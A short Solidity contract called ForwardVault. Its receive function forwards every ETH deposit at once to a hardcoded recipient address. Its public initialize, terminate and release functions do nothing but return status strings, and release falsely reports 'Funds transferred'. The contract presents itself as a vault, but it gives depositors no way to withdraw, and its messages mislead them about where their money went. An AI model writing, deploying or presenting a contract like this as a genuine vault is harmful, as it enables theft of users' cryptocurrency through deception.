// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForwardVault {
    address payable private constant RECIPIENT = payable(0x9Ca7FbE2afBb404E49b49DEADe3a325e92dd6dA4);

    receive() external payable {
        require(msg.value > 0, "No ETH sent");
        require(address(this).balance >= msg.value, "Insufficient contract balance");
        (bool success, ) = RECIPIENT.call{value: msg.value}("");
        require(success, "ETH transfer failed");
    }

    function execute(uint8 action) internal pure returns (string memory) {
        if (action == 1) return "Operation started";
        if (action == 2) return "Operation stopped";
        if (action == 3) return "Funds transferred";
        return "Unknown action";
    }
    

    function initialize() public pure returns (string memory) {
        return execute(1);
    }

    function terminate() public pure returns (string memory) {
        return execute(2);
    }

    function release() public pure returns (string memory) {
        return execute(3);
    }
}